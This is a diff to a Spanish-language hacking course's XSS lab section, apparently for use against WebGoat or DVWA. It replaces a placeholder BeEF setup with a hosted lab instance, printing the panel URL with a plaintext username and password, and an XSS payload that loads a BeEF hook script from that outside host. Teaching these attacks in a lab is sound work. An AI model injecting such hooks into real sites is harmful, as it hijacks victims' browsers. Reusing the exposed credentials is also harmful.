@@ -227,8 +227,10 @@ Si logramos ejecutar JavaScript arbitrario, el navegador se convierte en una **p
 ## 🧪 Demo guiada 2 — BeEF hook en XSS
 
 **Setup:**
-1. Levantar BeEF en Kali/laboratorio
-2. Copiar la URL del hook: `http://[IP]:3000/hook.js`
+
+BeEF ya está corriendo en el lab — no hace falta levantarlo:
+- Panel: https://beef.labs.manuel-roldan.cloud/ui/panel (usuario: beef / password: cursohacking2026)
+- Hook: https://beef.labs.manuel-roldan.cloud/hook.js
 
 **Target:** sitio vulnerable a XSS (WebGoat o DVWA)
 
@@ -236,7 +238,7 @@ Si logramos ejecutar JavaScript arbitrario, el navegador se convierte en una **p
 1. Inyectar payload con hook de BeEF:
 
 ```html
-<script src="http://[IP]:3000/hook.js"></script>
+<script src="https://beef.labs.manuel-roldan.cloud/hook.js"></script>
 ```
 
 2. Ver cómo el navegador se conecta al panel BeEF
